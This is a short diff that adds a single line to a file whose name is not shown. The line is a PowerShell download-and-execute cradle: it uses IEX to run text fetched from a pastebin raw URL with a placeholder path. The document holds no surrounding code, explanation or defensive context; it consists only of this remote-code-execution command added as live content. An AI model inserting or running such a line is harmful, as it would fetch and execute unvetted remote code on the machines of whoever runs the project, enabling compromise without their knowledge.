@@ -1,0 +1,2 @@
+IEX ((New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/EXAMPLE1'))
+
